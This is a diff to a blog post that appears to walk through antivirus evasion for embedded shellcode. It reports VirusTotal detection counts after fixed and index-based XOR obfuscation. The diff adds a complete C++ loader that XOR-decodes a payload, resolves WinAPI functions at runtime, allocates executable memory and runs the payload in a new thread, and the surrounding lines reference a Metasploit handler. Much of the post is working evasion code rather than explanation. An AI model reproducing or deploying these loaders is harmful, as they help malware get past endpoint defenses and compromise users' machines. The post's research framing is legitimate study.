@@ -66,6 +66,21 @@ msf6 exploit(multi/handler) > run
 
 <br>
 ### 2. Baseline
+Out of interest, I compiled a completely benign C++ program to throw into VirusTotal.
+
+{% highlight cpp %}
+int main() {
+    return 0;
+}
+{% endhighlight %}
+
+<br>
+You couldn't imagine my surprise when this was flagged by VirusTotal. Seems this vendor used a machine-learning based detection. Perhaps it hasn't seen such bare executables in its training dataset; demonstrating the unpredictable nature of AI prediction.
+
+![vt_benign](/assets/post_assets/embedded-shellcode-obfuscation/vt_benign.png)
+
+
+<br>
 Before attempting any obfuscation and anti-virus bypasses. I will throw this tested baseline sample into Virustotal.
 
 {% highlight cpp %}
@@ -83,6 +98,7 @@ int main() {
 
 <br>
 Here are the results. Extremely strange that only 26/70 vendors flagged this sample, considering it has no protection mechanisms at all. 
+
 SHA256: [1d2c5660e52b21d7a690d1d76af0f734e3b1bb59d6beff3f94c51c1296b6d92b](https://www.virustotal.com/gui/file/1d2c5660e52b21d7a690d1d76af0f734e3b1bb59d6beff3f94c51c1296b6d92b)
 
 ![vt_baseline](/assets/post_assets/embedded-shellcode-obfuscation/vt_baseline.png)
@@ -139,7 +155,8 @@ int main() {
 {% endhighlight %}
 
 <br>
-Huge improvement in bypassing static antivirus scans.
+Huge improvement in bypassing static antivirus scans. Highly strange that sandboxes are not flagging? It's malicious activity is semantically identical to the baseline. 
+
 SHA256: [0e247e2d325514022ca189b4f1d67ae6d8cec890f561a97e8857c6967df5902b](https://www.virustotal.com/gui/file/0e247e2d325514022ca189b4f1d67ae6d8cec890f561a97e8857c6967df5902b)
 
 ![vt_fixed_xor](/assets/post_assets/embedded-shellcode-obfuscation/vt_fixed_xor.png)
@@ -190,7 +207,8 @@ int main() {
 {% endhighlight %}
 
 <br>
-The results - 6/71 vendors detected. Same as the Fixed-XOR technique
+The results - 6/71 vendors detected. Same as the Fixed-XOR technique. Once again, no sandbox flags. Strange.
+
 SHA256: [7d7710c28190bc5d49187fd99bf042574705b57454ad770e7239b602596ddfbf](https://www.virustotal.com/gui/file/7d7710c28190bc5d49187fd99bf042574705b57454ad770e7239b602596ddfbf)
 
 ![vt_index_xor](/assets/post_assets/embedded-shellcode-obfuscation/vt_index_xor.png)
@@ -204,4 +222,47 @@ For the remaining incrementals, I will continue off the Index-XOR version.
 
 <br>
 ### 4. Dynamic Loading
-This section will test the 
+This section will test the evasive effectiveness of dynamically loading WinAPIs - and whether string obfuscation matters.
+
+I will generate 2 binaries, one with plaintext WinAPI strings, the other, obfuscated.
+
+<br>
+#### 4.1. Plaintext WinAPIs
+
+{% highlight cpp %}
+#include <windows.h>
+
+typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE hHandle, DWORD dwMilliseconds);
+
+void deobfuscate(unsigned char* deobfuscated_payload) {
+    int new_int {0};
+    for (int index {0}; index < sizeof(payload); index++) {
+        new_int = payload[index] ^ 0x27;
+        deobfuscated_payload[index] = new_int;
+    }
+}
+
+int main() {
+    char kernel32_str[] {"kernel32.dll"};
+    char virtual_alloc_str[] {"VirtualAlloc"};
+    char create_thread_str[] {"CreateThread"};
+    char wait_for_single_obj_str[] {"WaitForSingleObject"};
+
+    HMODULE kernel32 = LoadLibrary(kernel32_str);
+    VirtualAllocPtr virtual_alloc = (VirtualAllocPtr) GetProcAddress(kernel32, virtual_alloc_str);
+    CreateThreadPtr create_thread = (CreateThreadPtr) GetProcAddress(kernel32, create_thread_str);
+    WaitForSingleObjectPtr wait_for_single_obj = (WaitForSingleObjectPtr) GetProcAddress(kernel32, wait_for_single_obj_str);
+    
+    LPVOID memory = virtual_alloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    unsigned char deobfuscated_payload[sizeof(payload)];
+    deobfuscate(deobfuscated_payload);
+    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));
+
+    HANDLE hThread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
+    wait_for_single_obj(hThread, INFINITE);
+    return 0;
+}
+{% endhighlight %}
